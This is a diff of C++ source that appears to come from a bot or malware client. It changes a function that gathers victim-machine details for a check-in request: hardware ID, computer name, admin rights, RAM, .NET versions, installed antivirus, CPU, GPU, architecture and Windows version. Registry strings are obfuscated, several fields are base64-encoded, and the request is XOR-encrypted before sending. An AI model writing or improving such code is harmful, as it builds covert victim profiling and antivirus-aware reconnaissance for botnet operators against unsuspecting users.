@@ -22,21 +22,34 @@ public:
 
 
 	
+
 	static std::string returnFinalPost() {
-		std::string args = "hwid=" + Helpers::GetMachineGUID() +
+		std::string net2 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727"));
+		std::string net3 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0"));
+		std::string net35 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5"));
+		std::string net4 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4"));
+		std::string cpuName = base64_encode((const unsigned char*)OsHelpers::getCpuName().c_str(), OsHelpers::getCpuName().length());
+		std::string prcessorArchitecture = base64_encode((const unsigned char*)OsHelpers::PrcessorArchitecture().c_str(), OsHelpers::PrcessorArchitecture().length());
+		std::string gpuName = base64_encode((const unsigned char*)OsHelpers::getGpuName().c_str(), OsHelpers::getGpuName().length());
+		std::string av = base64_encode((const unsigned char*)Helpers::getCurrentAv().c_str(), Helpers::getCurrentAv().length());
+		std::string winver = base64_encode((const unsigned char*)Helpers::GetWindowsVersionString().c_str(), Helpers::GetWindowsVersionString().length());
+
+
+		std::string args = 
+			"hwid=" + Helpers::GetMachineGUID() +
 			"&computername=" + Helpers::getComputerName() +
-			"&cpuName=" + OsHelpers::getCpuName() +
 			"&aornot=" + OsHelpers::checkPEIsAdmin() +
-			"&gpuName=" + OsHelpers::getCpuName() +
-			"&prcessorArchitecture=" + OsHelpers::PrcessorArchitecture() +
 			"&installedRam=" + OsHelpers::getRam() +
-			"&netFramework2=" + Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727")) +
-			"&netFramework3=" + Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0")) +
-			"&netFramework35=" + Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5")) +
-			"&netFramework4=" + Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4")) +
-			"&antivirus=" + Helpers::getCurrentAv() +
+			"&netFramework2=" + net2 +
+			"&netFramework3=" + net3 +
+			"&netFramework35=" + net35 +
+			"&netFramework4=" + net4 +
+			"&antivirus=" + av +
 			"&botversion=2.1" +
-			"&operingsystem=" + Helpers::GetWindowsVersionString();
+			"&gpuName=" + gpuName +
+			"&cpuName=" + cpuName +
+			"&arch=" + prcessorArchitecture +
+			"&operingsystem=" + winver;
 		std::string finalPost = "request=" + XOR::encryptReqeust(args);
 		return finalPost;
 	}
